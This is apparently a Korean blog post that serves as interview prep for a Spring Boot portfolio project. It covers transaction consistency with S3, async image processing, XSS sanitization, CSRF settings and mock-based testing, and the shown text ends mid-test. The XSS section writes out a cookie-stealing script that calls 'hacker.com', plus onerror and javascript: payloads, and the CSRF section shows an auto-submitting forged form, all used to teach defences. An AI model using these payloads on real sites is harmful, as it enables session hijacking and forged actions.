---
title: "📚[Backend Development] 🚀 kobe-website 기술 면접 완벽 가이드"
tags:
  - Backend Development
  - Server
  - Java
  - Interview
  - Project

date: "2026-01-26"
thumbnail: "/assets/img/thumbnail/BackendDevelopment.jpg"
---

# 💼 kobe-website 기술 면접 완벽 가이드

> 실무 프로젝트 구현 시 마주치는 5가지 핵심 기술 질문과 모범 답변

---

## 📋 목차

1. [트랜잭션과 외부 리소스의 정합성](#1-트랜잭션과-외부-리소스의-정합성)
2. [동기식 이미지 처리와 서버 성능](#2-동기식-이미지-처리와-서버-성능)
3. [Markdown 사용 시 보안 위협 (XSS)](#3-markdown-사용-시-보안-위협-xss)
4. [보안 설정의 차이와 이유](#4-보안-설정의-차이와-이유)
5. [테스트 전략](#5-테스트-전략)
6. [핵심 요약](#핵심-요약)

---

## 1️⃣ 트랜잭션과 외부 리소스의 정합성

### 🎯 면접 질문

> "`ProjectService`의 `deleteProject` 메서드를 보면, **S3에서 파일을 삭제한 후 DB 데이터를 삭제하고 있습니다.**
>
> 만약 S3 파일 삭제는 성공했는데, 그 직후 DB 삭제 중에 에러가 발생해서 트랜잭션이 롤백된다면 어떻게 되나요?
>
> 반대로, DB 삭제가 먼저 일어나고 S3 삭제가 실패한다면요?
>
> 이 둘 사이의 데이터 불일치(Inconsistency) 문제는 어떻게 해결하실 건가요?"

### 🔍 면접관의 의도

이 질문은 다음을 평가합니다:

|      평가 항목      | 세부 내용                                  |
| :-----------------: | ------------------------------------------ |
| **트랜잭션 이해도** | Spring의 `@Transactional` 동작 범위와 한계 |
|  **아키텍처 사고**  | 외부 시스템(S3)과 DB 간의 정합성 문제 인식 |
| **문제 해결 능력**  | 고아 객체, Broken Link 문제에 대한 해결책  |

### 🚨 현재 코드의 문제점

```java
@Transactional
public void deleteProject(Long id) {
    // 1. S3 파일 삭제 (트랜잭션 범위 밖!)
    s3Template.deleteObject(fileKey);

    // 2. DB 삭제 (트랜잭션 범위 안)
    projectRepository.delete(project);
    // 만약 여기서 예외 발생 → DB 롤백, 하지만 S3는 이미 삭제됨! 💥
}
```

#### 💥 발생 가능한 문제 시나리오

|      순서      | 작업                        | 결과 | 문제점                                       |
| :------------: | --------------------------- | :--: | -------------------------------------------- |
| **시나리오 1** | S3 삭제 성공 → DB 삭제 실패 |  ⚠️  | 파일은 없는데 DB에는 기록 존재 (Broken Link) |
| **시나리오 2** | DB 삭제 성공 → S3 삭제 실패 |  ⚠️  | DB 기록은 없는데 파일만 남음 (고아 객체)     |

---

### ✅ 모범 답변

> "현재 제 코드(`ProjectService.java`)는 S3 파일 삭제를 먼저 수행하고 DB 데이터를 삭제하도록 구현되어 있어, 말씀하신 대로 **DB 트랜잭션 롤백 시 파일만 유실되는 문제(Broken Link)**가 발생할 수 있습니다.
>
> 이를 해결하기 위해 **이벤트 기반 아키텍처**나 **Soft Delete** 방식을 도입하겠습니다."

---

### 🛠️ 해결 방법 1: Soft Delete (단기적)

#### 개념

물리적 삭제 대신 논리적 삭제로 안전성 확보

#### 구현 예시

```java
@Entity
@SQLDelete(sql = "UPDATE project SET deleted_at = NOW() WHERE id = ?")
@Where(clause = "deleted_at IS NULL")
public class Project extends BaseEntity {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    private String title;
    private String imageUrl;

    @Column(name = "deleted_at")
    private LocalDateTime deletedAt;
}
```

```java
@Service
public class ProjectService {

    @Transactional
    public void deleteProject(Long id) {
        Project project = projectRepository.findById(id)
            .orElseThrow(() -> new NotFoundException("프로젝트를 찾을 수 없습니다."));

        // 1. DB에서 Soft Delete (deleted_at 업데이트)
        projectRepository.delete(project);  // 실제로는 UPDATE

        // 2. S3 삭제는 여기서 하지 않음!
    }
}
```

#### 스케줄러로 일괄 정리

```java
@Component
@RequiredArgsConstructor
public class OrphanFileCleanupScheduler {

    private final ProjectRepository projectRepository;
    private final S3Template s3Template;

    @Scheduled(cron = "0 0 3 * * *")  // 매일 새벽 3시
    public void cleanupOrphanFiles() {
        LocalDateTime threshold = LocalDateTime.now().minusDays(7);

        List<Project> deletedProjects = projectRepository
            .findAllByDeletedAtBefore(threshold);

        for (Project project : deletedProjects) {
            try {
                // S3 파일 삭제
                s3Template.deleteObject(project.getImageKey());

                // DB에서 완전 삭제
                projectRepository.hardDelete(project.getId());

                log.info("정리 완료: {}", project.getId());
            } catch (Exception e) {
                log.error("정리 실패: {}", project.getId(), e);
            }
        }
    }
}
```

#### ✨ 장점

|       장점       | 설명                              |
| :--------------: | --------------------------------- |
|  🛡️ **안전성**   | 즉시 삭제하지 않아 실수 복구 가능 |
|  🔄 **정합성**   | 배치로 재시도 가능                |
| 📊 **감사 추적** | 삭제 이력 보존                    |

---

### 🛠️ 해결 방법 2: TransactionalEventListener (장기적)

#### 개념

DB 트랜잭션 커밋 후에만 S3 삭제 실행

#### 구현 예시

##### 1단계: 이벤트 클래스 생성

```java
@Getter
@AllArgsConstructor
public class ProjectDeletedEvent {
    private final String imageKey;
    private final Long projectId;
}
```

##### 2단계: Service에서 이벤트 발행

```java
@Service
@RequiredArgsConstructor
public class ProjectService {

    private final ProjectRepository projectRepository;
    private final ApplicationEventPublisher eventPublisher;

    @Transactional
    public void deleteProject(Long id) {
        Project project = projectRepository.findById(id)
            .orElseThrow(() -> new NotFoundException("프로젝트를 찾을 수 없습니다."));

        String imageKey = project.getImageKey();

        // 1. DB 삭제 먼저!
        projectRepository.delete(project);

        // 2. 이벤트 발행 (아직 S3 삭제 안 함)
        eventPublisher.publishEvent(new ProjectDeletedEvent(imageKey, id));
    }
}
```

##### 3단계: 이벤트 리스너 구현

```java
@Component
@RequiredArgsConstructor
@Slf4j
public class ProjectEventListener {

    private final S3Template s3Template;

    @TransactionalEventListener(phase = TransactionPhase.AFTER_COMMIT)
    public void handleProjectDeleted(ProjectDeletedEvent event) {
        try {
            // DB 커밋 성공 후에만 실행됨!
            s3Template.deleteObject(event.getImageKey());
            log.info("S3 파일 삭제 완료: {}", event.getImageKey());
        } catch (Exception e) {
            log.error("S3 파일 삭제 실패: {}", event.getImageKey(), e);
            // TODO: 실패 시 재시도 큐에 추가 또는 알림
        }
    }

    @TransactionalEventListener(phase = TransactionPhase.AFTER_ROLLBACK)
    public void handleProjectDeleteFailed(ProjectDeletedEvent event) {
        log.warn("프로젝트 삭제 실패 (롤백됨): {}", event.getProjectId());
        // S3 삭제가 실행되지 않음!
    }
}
```

#### 🔄 동작 흐름

```
1. deleteProject() 호출
2. DB DELETE 실행 (아직 커밋 안 됨)
3. 이벤트 발행 (내부 큐에 저장)
4-A. 트랜잭션 커밋 성공 → @TransactionalEventListener 실행 → S3 삭제
4-B. 트랜잭션 롤백 → 이벤트 무시됨 → S3 삭제 안 함
```

#### ✨ 장점

|        장점        | 설명                                  |
| :----------------: | ------------------------------------- |
| ✅ **정합성 보장** | DB 롤백 시 S3 삭제도 취소됨           |
| 🎯 **관심사 분리** | 비즈니스 로직과 외부 시스템 분리      |
|   🔄 **확장성**    | 이벤트 기반으로 다른 작업도 추가 가능 |

---

### 📊 두 방법 비교

|      구분       |    Soft Delete     | TransactionalEventListener |
| :-------------: | :----------------: | :------------------------: |
| **구현 난이도** |      쉬움 ⭐       |         보통 ⭐⭐          |
|   **정합성**    | 배치 주기만큼 지연 |         즉시 보장          |
| **복구 가능성** |      높음 ✅       |            낮음            |
|  **저장 공간**  |      더 필요       |            절약            |
|  **적용 시점**  |        단기        |            장기            |

### 💡 추천 조합

```
1단계 (즉시): Soft Delete 도입
2단계 (1개월 후): TransactionalEventListener 추가
3단계 (3개월 후): 배치로 오래된 Soft Delete 데이터 정리
```

---

## 2️⃣ 동기식 이미지 처리와 서버 성능

### 🎯 면접 질문

> "`ProjectService`에서 이미지를 업로드할 때 `ImageResizeUtil`을 통해 리사이징을 수행하고 S3에 업로드합니다. 이 작업은 현재 **웹 요청을 처리하는 스레드에서 동기적(Synchronous)**으로 이루어지고 있습니다.
>
> 만약 동시에 수십 명의 사용자가 고해상도 이미지를 업로드한다면 서버의 스레드 풀(Thread Pool)이 고갈되거나 응답 지연이 발생할 텐데, 이를 개선할 아키텍처적인 방법이 있을까요?"

### 🔍 면접관의 의도

|     평가 항목     | 세부 내용                               |
| :---------------: | --------------------------------------- |
|  **성능 이해도**  | CPU/IO 집약적 작업의 차이와 위험성 인식 |
|  **비동기 처리**  | `@Async`, 메시지 큐 등 비동기 패턴 이해 |
| **아키텍처 설계** | 서버리스, 마이크로서비스 등 대안 제시   |

### 🚨 현재 코드의 문제점

```java
@Service
@Transactional
public class ProjectService {

    public Project saveProject(ProjectRequest request) {
        // 1. 이미지 리사이징 (CPU 집약적) - 블로킹! 😰
        BufferedImage resized = ImageResizeUtil.resize(
            request.getImage(), 800, 600
        );

        // 2. S3 업로드 (I/O 집약적) - 블로킹! 😰
        String imageUrl = s3Template.upload(resized);

        // 3. DB 저장
        return projectRepository.save(project);
    }
}
```

#### 💥 문제 시나리오

```
동시 사용자 100명 × 평균 처리 시간 3초 = ?

Tomcat 기본 스레드 풀: 200개
→ 100명이 요청 → 100개 스레드 점유
→ 각 3초씩 대기 → 스레드 풀 고갈 위험
→ 추가 요청은 큐에서 대기 → 타임아웃 발생!
```

---

### ✅ 모범 답변

> "네, 지적해주신 대로 현재는 `saveProject` 메서드 내에서 이미지 리사이징과 S3 업로드가 동기적(Blocking)으로 실행되어, 트래픽이 몰리면 톰캣의 스레드 풀이 고갈될 위험이 있습니다.
>
> 이를 개선하기 위해 **비동기 처리** 혹은 **아키텍처 변경**을 고려하겠습니다."

---

### 🛠️ 해결 방법 1: Spring @Async (단기적)

#### 개념

무거운 작업을 별도 스레드 풀에서 비동기 처리

#### 구현 예시

##### 1단계: AsyncConfig 설정

```java
@Configuration
@EnableAsync
public class AsyncConfig {

    @Bean(name = "imageTaskExecutor")
    public ThreadPoolTaskExecutor imageTaskExecutor() {
        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();
        executor.setCorePoolSize(10);
        executor.setMaxPoolSize(20);
        executor.setQueueCapacity(100);
        executor.setThreadNamePrefix("ImageAsync-");
        executor.setRejectedExecutionHandler(
            new ThreadPoolExecutor.CallerRunsPolicy()
        );
        executor.initialize();
        return executor;
    }
}
```

##### 2단계: AsyncService 분리

```java
@Service
@RequiredArgsConstructor
@Slf4j
public class ImageAsyncService {

    private final S3Template s3Template;
    private final ProjectRepository projectRepository;

    @Async("imageTaskExecutor")
    public CompletableFuture<String> processAndUploadImage(
        MultipartFile image,
        Long projectId
    ) {
        try {
            // 1. 이미지 리사이징
            BufferedImage resized = ImageResizeUtil.resize(image, 800, 600);

            // 2. S3 업로드
            String imageUrl = s3Template.upload(
                resized,
                "projects/" + projectId
            );

            // 3. DB 업데이트
            projectRepository.updateImageUrl(projectId, imageUrl);

            log.info("이미지 처리 완료: {}", projectId);
            return CompletableFuture.completedFuture(imageUrl);

        } catch (Exception e) {
            log.error("이미지 처리 실패: {}", projectId, e);
            return CompletableFuture.failedFuture(e);
        }
    }
}
```

##### 3단계: Service에서 사용

```java
@Service
@RequiredArgsConstructor
public class ProjectService {

    private final ProjectRepository projectRepository;
    private final ImageAsyncService imageAsyncService;

    @Transactional
    public Project saveProject(ProjectRequest request) {
        // 1. 프로젝트 먼저 저장 (임시 이미지 URL)
        Project project = Project.builder()
            .title(request.getTitle())
            .description(request.getDescription())
            .imageUrl("processing...")  // 임시 값
            .build();

        Project saved = projectRepository.save(project);

        // 2. 비동기로 이미지 처리 (즉시 리턴!)
        imageAsyncService.processAndUploadImage(
            request.getImage(),
            saved.getId()
        );

        return saved;  // 3초 기다리지 않고 즉시 응답!
    }
}
```

##### 4단계: 프론트엔드에서 폴링

```javascript
// 프로젝트 생성 후
const response = await createProject(formData);
const projectId = response.id;

// 이미지 처리 완료까지 폴링
const checkImageReady = setInterval(async () => {
  const project = await getProject(projectId);
  if (project.imageUrl !== "processing...") {
    clearInterval(checkImageReady);
    // 이미지 표시
    updateUI(project.imageUrl);
  }
}, 2000); // 2초마다 확인
```

#### ✨ 장점

|       장점       | 설명                                    |
| :--------------: | --------------------------------------- |
| ⚡ **빠른 응답** | 사용자는 즉시 결과 확인                 |
| 🔧 **적용 쉬움** | 기존 코드 최소 변경                     |
|   🎯 **격리**    | 무거운 작업이 메인 스레드 풀 영향 안 줌 |

#### ⚠️ 주의사항

- 별도 스레드에서 실행되므로 트랜잭션 전파 안 됨
- 실패 처리 전략 필요 (재시도, 알림 등)

---

### 🛠️ 해결 방법 2: AWS Lambda (장기적)

#### 개념

서버 부하를 완전히 제거하고 서버리스로 처리

#### 아키텍처

```
[클라이언트]
    ↓
    1. Presigned URL 요청
    ↓
[Spring Boot API]
    ↓
    2. Presigned URL 생성 & 반환
    ↓
[클라이언트]
    ↓
    3. S3에 원본 이미지 직접 업로드
    ↓
[S3 Bucket]
    ↓
    4. S3 Event Notification 발생
    ↓
[AWS Lambda]
    ↓
    5. 이미지 리사이징
    ↓
    6. 리사이징된 이미지를 다른 버킷에 저장
    ↓
    7. API에 Webhook 전송
    ↓
[Spring Boot API]
    ↓
    8. DB에 최종 이미지 URL 업데이트
```

#### 구현 예시

##### 1단계: Presigned URL 생성

```java
@Service
@RequiredArgsConstructor
public class S3Service {

    private final AmazonS3 s3Client;

    @Value("${aws.s3.bucket}")
    private String bucketName;

    public PresignedUrlResponse generatePresignedUrl(String fileName) {
        String key = "uploads/original/" + UUID.randomUUID() + "-" + fileName;

        Date expiration = new Date();
        expiration.setTime(expiration.getTime() + 1000 * 60 * 10); // 10분

        GeneratePresignedUrlRequest request = new GeneratePresignedUrlRequest(
            bucketName, key
        )
        .withMethod(HttpMethod.PUT)
        .withExpiration(expiration);

        URL url = s3Client.generatePresignedUrl(request);

        return PresignedUrlResponse.builder()
            .uploadUrl(url.toString())
            .key(key)
            .build();
    }
}
```

##### 2단계: Lambda 함수 (Python)

```python
import boto3
from PIL import Image
import io
import os

s3 = boto3.client('s3')

def lambda_handler(event, context):
    # S3 이벤트에서 정보 추출
    bucket = event['Records'][0]['s3']['bucket']['name']
    key = event['Records'][0]['s3']['object']['key']

    # 원본 이미지 다운로드
    response = s3.get_object(Bucket=bucket, Key=key)
    image_data = response['Body'].read()

    # 이미지 리사이징
    image = Image.open(io.BytesIO(image_data))
    resized = image.resize((800, 600), Image.LANCZOS)

    # 버퍼에 저장
    buffer = io.BytesIO()
    resized.save(buffer, format='JPEG', quality=85)
    buffer.seek(0)

    # 리사이징된 이미지 업로드
    resized_key = key.replace('original/', 'resized/')
    s3.put_object(
        Bucket=bucket,
        Key=resized_key,
        Body=buffer,
        ContentType='image/jpeg'
    )

    # API에 Webhook 전송
    import requests
    api_url = os.environ['API_WEBHOOK_URL']
    requests.post(api_url, json={
        'original_key': key,
        'resized_key': resized_key,
        'status': 'completed'
    })

    return {
        'statusCode': 200,
        'body': 'Image processed successfully'
    }
```

##### 3단계: Webhook 엔드포인트

```java
@RestController
@RequestMapping("/api/webhooks")
@RequiredArgsConstructor
public class WebhookController {

    private final ProjectRepository projectRepository;

    @PostMapping("/image-processed")
    public ResponseEntity<Void> handleImageProcessed(
        @RequestBody ImageProcessedEvent event
    ) {
        // DB 업데이트
        projectRepository.updateImageByOriginalKey(
            event.getOriginalKey(),
            event.getResizedKey()
        );

        return ResponseEntity.ok().build();
    }
}
```

#### ✨ 장점

|       장점       | 설명                       |
| :--------------: | -------------------------- |
| 🚀 **무한 확장** | Lambda는 자동 스케일링     |
| 💰 **비용 효율** | 사용한 만큼만 과금         |
| 🛡️ **서버 보호** | 이미지 처리 부하 완전 제거 |

---

### 📊 두 방법 비교

|      구분       | Spring @Async  |   AWS Lambda    |
| :-------------: | :------------: | :-------------: |
| **구현 복잡도** |    쉬움 ⭐     |  복잡 ⭐⭐⭐⭐  |
|    **비용**     |  서버 유지비   |   사용량 기반   |
|   **확장성**    | 스레드 풀 한계 |     무제한      |
|  **모니터링**   |      쉬움      | CloudWatch 필요 |
|  **적용 시점**  |      단기      |      장기       |

---

## 3️⃣ Markdown 사용 시 보안 위협 (XSS)

### 🎯 면접 질문

> "프로젝트 설명에 Markdown을 도입하여 `MarkdownUtil`을 통해 HTML로 변환해 보여주고 있습니다.
>
> 만약 악의적인 사용자가 Markdown 내용 안에 `<script>alert('hacked')</script>`와 같은 자바스크립트 코드를 삽입한다면 어떻게 되나요? (XSS 공격)
>
> 현재 사용 중인 `commonmark` 라이브러리 설정에서 이에 대한 필터링(Sanitization)이 적용되어 있나요?"

### 🔍 면접관의 의도

|      평가 항목      | 세부 내용                             |
| :-----------------: | ------------------------------------- |
|    **보안 인식**    | XSS(Cross-Site Scripting) 공격 이해도 |
|    **방어 기법**    | HTML Sanitization 필요성 인식         |
| **라이브러리 지식** | OWASP, commonmark 등 도구 활용        |

### 🚨 XSS 공격 시나리오

#### 공격 예시

```markdown
# 안녕하세요

제 프로젝트를 소개합니다!

<script>
  // 사용자 쿠키 탈취
  fetch('https://hacker.com/steal?cookie=' + document.cookie);
</script>

<img src="x" onerror="alert('XSS Attack!')">

[Click me](<javascript:alert('XSS')>)
```

#### 현재 코드의 취약점

```java
public class MarkdownUtil {

    private static final Parser parser = Parser.builder().build();
    private static final HtmlRenderer renderer = HtmlRenderer.builder().build();

    public static String toHtml(String markdown) {
        Node document = parser.parse(markdown);
        return renderer.render(document);  // 😰 필터링 없이 그대로 반환!
    }
}
```

#### 렌더링 결과

```html
<h1>안녕하세요</h1>
<p>제 프로젝트를 소개합니다!</p>
<script>
  fetch("https://hacker.com/steal?cookie=" + document.cookie);
</script>
<img src="x" onerror="alert('XSS Attack!')" />
<a href="javascript:alert('XSS')">Click me</a>
```

💥 **스크립트가 그대로 실행됨!**

---

### ✅ 모범 답변

> "현재 `MarkdownUtil.java`에서 사용하는 `commonmark` 라이브러리는 기본적으로 XSS 필터링을 제공하지 않아 스크립트 주입 공격에 취약할 수 있음을 인정합니다.
>
> 이를 방어하기 위해 **OWASP Java HTML Sanitizer** 라이브러리를 추가하겠습니다."

---

### 🛠️ 해결 방법: HTML Sanitizer 적용

#### 1단계: 의존성 추가

```gradle
dependencies {
    // Markdown 파싱
    implementation 'org.commonmark:commonmark:0.21.0'

    // HTML Sanitization
    implementation 'com.googlecode.owasp-java-html-sanitizer:owasp-java-html-sanitizer:20220608.1'
}
```

#### 2단계: MarkdownUtil 개선

```java
import org.commonmark.node.Node;
import org.commonmark.parser.Parser;
import org.commonmark.renderer.html.HtmlRenderer;
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

public class MarkdownUtil {

    private static final Parser parser = Parser.builder().build();
    private static final HtmlRenderer renderer = HtmlRenderer.builder().build();

    // OWASP Sanitizer 정책 설정
    private static final PolicyFactory POLICY = Sanitizers.FORMATTING
        .and(Sanitizers.BLOCKS)
        .and(Sanitizers.LINKS)
        .and(Sanitizers.IMAGES)
        .and(Sanitizers.STYLES);

    public static String toHtml(String markdown) {
        if (markdown == null || markdown.isBlank()) {
            return "";
        }

        // 1. Markdown → HTML 변환
        Node document = parser.parse(markdown);
        String rawHtml = renderer.render(document);

        // 2. HTML Sanitization 적용
        String cleanHtml = POLICY.sanitize(rawHtml);

        return cleanHtml;
    }
}
```

#### 3단계: 커스텀 정책 (더 세밀한 제어)

```java
import org.owasp.html.HtmlPolicyBuilder;

public class CustomSanitizer {

    private static final PolicyFactory POLICY = new HtmlPolicyBuilder()
        // 허용할 태그
        .allowElements(
            "p", "br", "div", "span",
            "h1", "h2", "h3", "h4", "h5", "h6",
            "strong", "em", "b", "i", "u",
            "ul", "ol", "li",
            "blockquote", "code", "pre",
            "a", "img"
        )

        // <a> 태그 속성 제한
        .allowAttributes("href").onElements("a")
        .allowStandardUrlProtocols()  // http, https만 허용
        .requireRelNofollowOnLinks()  // 외부 링크에 rel="nofollow" 추가

        // <img> 태그 속성 제한
        .allowAttributes("src", "alt", "width", "height").onElements("img")

        // <code> 태그 속성
        .allowAttributes("class").matching(Pattern.compile("language-\\w+"))
            .onElements("code")

        // 위험한 프로토콜 차단
        .disallowUrlProtocols("javascript", "data", "vbscript")

        .toFactory();

    public static String sanitize(String html) {
        return POLICY.sanitize(html);
    }
}
```

#### 4단계: 테스트

```java
@Test
void xss공격_방어_테스트() {
    String maliciousMarkdown = """
        # Hello

        <script>alert('XSS')</script>
        <img src="x" onerror="alert('XSS')">
        [Link](javascript:alert('XSS'))
        """;

    String result = MarkdownUtil.toHtml(maliciousMarkdown);

    // 스크립트 태그 제거 확인
    assertThat(result).doesNotContain("<script>");
    assertThat(result).doesNotContain("onerror");
    assertThat(result).doesNotContain("javascript:");

    // 정상 컨텐츠는 유지
    assertThat(result).contains("<h1>Hello</h1>");
}
```

#### 결과

```html
<!-- 변환 전 -->
<h1>Hello</h1>
<script>
  alert("XSS");
</script>
<img src="x" onerror="alert('XSS')" />
<a href="javascript:alert('XSS')">Link</a>

<!-- 변환 후 (Sanitized) -->
<h1>Hello</h1>
<!-- script 태그 완전 제거 -->
<img src="x" />
<!-- onerror 속성 제거 -->
<a>Link</a>
<!-- javascript: URL 제거 -->
```

---

### 📊 주요 차단 항목

|     위협 유형     | 예시                   | Sanitizer 동작       |
| :---------------: | ---------------------- | -------------------- |
| **스크립트 태그** | `<script>...</script>` | 완전 제거            |
| **이벤트 핸들러** | `onerror`, `onclick`   | 속성 제거            |
|  **위험한 URL**   | `javascript:`, `data:` | URL 제거 또는 무력화 |
|    **iframe**     | `<iframe src="...">`   | 태그 제거            |
| **embed/object**  | `<embed>`, `<object>`  | 태그 제거            |

---

### ✨ 추가 보안 강화

#### Content Security Policy (CSP)

```java
@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives(
                    "default-src 'self'; " +
                    "script-src 'self'; " +
                    "style-src 'self' 'unsafe-inline'; " +
                    "img-src 'self' https:; " +
                    "font-src 'self';"
                )
            )
        );
        return http.build();
    }
}
```

---

## 4️⃣ 보안 설정의 차이와 이유

### 🎯 면접 질문

> "`DevSecurityConfig`와 `ProdSecurityConfig`를 분리하셨는데, 운영 환경(Prod)에서는 `csrf` 설정을 명시적으로 끄지 않았습니다(기본값 활성화).
>
> 그렇다면 프로젝트 등록/삭제 같은 POST 요청 시 프론트엔드(Thymeleaf)에서 CSRF 토큰 처리는 어떻게 이루어지고 있나요?
>
> 또한, 개발 환경에서 `h2-console`을 위해 CSRF를 끈 이유는 무엇인가요?"

### 🔍 면접관의 의도

|      평가 항목      | 세부 내용                               |
| :-----------------: | --------------------------------------- |
|    **보안 개념**    | CSRF(Cross-Site Request Forgery) 이해도 |
| **프레임워크 지식** | Spring Security의 CSRF 보호 메커니즘    |
|    **실무 감각**    | 환경별 설정 분리 이유와 트레이드오프    |

---

### 💡 CSRF란?

#### 공격 시나리오

```
1. 사용자가 은행 사이트에 로그인 (쿠키 생성)
2. 악의적인 사이트 방문
3. 악의적인 사이트에 숨겨진 폼:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="hacker">
     <input name="amount" value="1000000">
   </form>
   <script>document.forms[0].submit();</script>
4. 사용자 모르게 송금 요청 전송 (쿠키가 자동으로 포함됨!)
5. 은행 서버는 정상 요청으로 인식하여 처리
```

#### CSRF 토큰으로 방어

```
1. 서버가 각 세션에 랜덤 토큰 생성
2. 폼 전송 시 토큰 포함 필수
3. 서버는 토큰 검증
4. 악의적인 사이트는 토큰을 알 수 없어 공격 실패
```

---

### ✅ 모범 답변

> "운영 환경(`ProdSecurityConfig.java`)에서 CSRF를 끄지 않은 이유는 **보안 권장 사항**을 준수하기 위해서입니다.
>
> 프론트엔드로 사용 중인 **Thymeleaf**는 폼(`th:action`) 생성 시 자동으로 CSRF 토큰(`_csrf`)을 hidden 필드로 삽입해주기 때문에, 별도의 설정 없이도 안전하게 POST 요청을 처리할 수 있습니다.
>
> 반면 개발 환경(`DevSecurityConfig.java`)의 **H2 Console**은 내부적으로 iframe을 사용하고 자체적인 비동기 통신을 하는데, 이 과정에서 CSRF 토큰 검증을 통과하기 어렵습니다. 따라서 개발 생산성을 위해 `PathRequest.toH2Console()` 요청에 대해서만 예외적으로 CSRF 보호를 비활성화했습니다."

---

### 🛠️ 구현 상세

#### 1️⃣ 운영 환경 설정 (Prod)

```java
@Configuration
@Profile("prod")
public class ProdSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(Customizer.withDefaults())  // CSRF 활성화 (기본값)
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/projects/**").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .formLogin(Customizer.withDefaults());

        return http.build();
    }
}
```

#### 2️⃣ 개발 환경 설정 (Dev)

```java
@Configuration
@Profile("dev")
public class DevSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/h2-console/**").permitAll()
                .anyRequest().permitAll()
            )
            // H2 Console을 위한 설정
            .csrf(csrf -> csrf
                .ignoringRequestMatchers(PathRequest.toH2Console())
            )
            .headers(headers -> headers
                .frameOptions(HeadersConfigurer.FrameOptionsConfig::sameOrigin)
            );

        return http.build();
    }
}
```

#### 3️⃣ Thymeleaf 폼 예시

```html
<!-- 프로젝트 등록 폼 -->
<form th:action="@{/projects}" method="post" enctype="multipart/form-data">
  <!-- Thymeleaf가 자동으로 CSRF 토큰 삽입! -->
  <!-- <input type="hidden" name="_csrf" value="abc123..."/> -->

  <input type="text" name="title" required />
  <textarea name="description" required></textarea>
  <input type="file" name="image" accept="image/*" required />

  <button type="submit">등록</button>
</form>
```

#### 렌더링된 HTML

```html
<form action="/projects" method="post" enctype="multipart/form-data">
  <!-- Thymeleaf가 자동 생성 -->
  <input
    type="hidden"
    name="_csrf"
    value="4a8f9b2c-3d1e-4f5a-8b6c-9d2e1f3a4b5c"
  />

  <input type="text" name="title" required />
  <textarea name="description" required></textarea>
  <input type="file" name="image" accept="image/*" required />

  <button type="submit">등록</button>
</form>
```

---

### 📊 환경별 CSRF 설정 비교

|      구분       |    운영(Prod)    |        개발(Dev)         |
| :-------------: | :--------------: | :----------------------: |
| **CSRF 기본값** |    ✅ 활성화     | ⚠️ H2 Console만 비활성화 |
|    **이유**     |    보안 우선     |       개발 편의성        |
|  **Thymeleaf**  |  자동 토큰 삽입  |           동일           |
|  **API 요청**   | 헤더에 토큰 필요 |           동일           |

---

### 🔧 AJAX/API 요청 시 CSRF 토큰 전송

#### HTML에서 메타 태그로 토큰 제공

```html
<head>
  <meta name="_csrf" th:content="${_csrf.token}" />
  <meta name="_csrf_header" th:content="${_csrf.headerName}" />
</head>
```

#### JavaScript에서 토큰 읽어서 전송

```javascript
// 토큰 읽기
const token = document.querySelector('meta[name="_csrf"]').content;
const header = document.querySelector('meta[name="_csrf_header"]').content;

// AJAX 요청 시 헤더에 포함
fetch("/api/projects", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    [header]: token, // CSRF 토큰 헤더
  },
  body: JSON.stringify(projectData),
});
```

---

### 🎯 H2 Console CSRF 예외 처리 이유

#### H2 Console의 특징

1. **iframe 사용**: 콘솔 UI가 iframe으로 렌더링됨
2. **자체 통신**: H2가 자체적으로 AJAX 요청 수행
3. **토큰 미포함**: H2는 Spring Security의 CSRF 토큰을 모름

#### 해결 방법

```java
.csrf(csrf -> csrf
    .ignoringRequestMatchers(PathRequest.toH2Console())  // H2만 예외
)
```

> ⚠️ **주의**: 운영 환경에서는 절대 H2 Console을 사용하면 안 됨!

---

## 5️⃣ 테스트 전략

### 🎯 면접 질문

> "현재 `ProjectService`는 `S3Template`이라는 외부 의존성을 가지고 있습니다.
>
> 이 서비스를 단위 테스트(Unit Test)하라고 한다면, 실제 AWS S3에 파일을 올리지 않고 어떻게 테스트 코드를 작성하시겠습니까?"

### 🔍 면접관의 의도

|     평가 항목     | 세부 내용                                    |
| :---------------: | -------------------------------------------- |
| **테스트 이해도** | 단위 테스트 vs 통합 테스트 구분              |
| **Mocking 기법**  | Mockito 등 테스트 도구 활용 능력             |
|   **실무 경험**   | TestContainers, LocalStack 등 고급 도구 인지 |

---

### ✅ 모범 답변

> "외부 서비스인 AWS S3에 의존하는 코드를 테스트할 때는 **Mocking**을 활용하겠습니다.
>
> 단위 테스트 작성 시 `Mockito` 프레임워크를 사용하여 `S3Template`을 Mock 객체(`@MockBean`)로 만듭니다.
>
> `when(s3Template.upload(...)).thenReturn(...)`과 같이 업로드 메서드의 동작을 가짜로 정의(Stubbing)함으로써, 실제 네트워크 통신이나 비용 발생 없이 `ProjectService`의 비즈니스 로직만 빠르고 격리된 환경에서 검증하겠습니다.
>
> 더 나아가 통합 테스트가 필요하다면 **LocalStack** 같은 도구를 활용해 로컬 Docker 환경에서 가상의 AWS 환경을 구성해 테스트하겠습니다."

---

### 🛠️ 구현 예시

#### 1️⃣ 단위 테스트 (Mockito)

```java
@ExtendWith(MockitoExtension.class)
class ProjectServiceTest {

    @Mock
    private ProjectRepository projectRepository;

    @Mock
    private S3Template s3Template;

    @InjectMocks
    private ProjectService projectService;

    @Test
    @DisplayName("프로젝트 저장 시 S3에 이미지 업로드 후 DB에 저장한다")
    void saveProject_Success() {
        // Given
        ProjectRequest request = ProjectRequest.builder()
            .title("Test Project")
            .description("Test Description")
            .image(createMockMultipartFile())
            .build();

        String expectedImageUrl = "https://s3.amazonaws.com/bucket/image.jpg";

        // S3 업로드 Mock 설정
        when(s3Template.upload(any(BufferedImage.class), anyString()))
            .thenReturn(expectedImageUrl);

        Project savedProject = Project.builder()
            .id(1L)
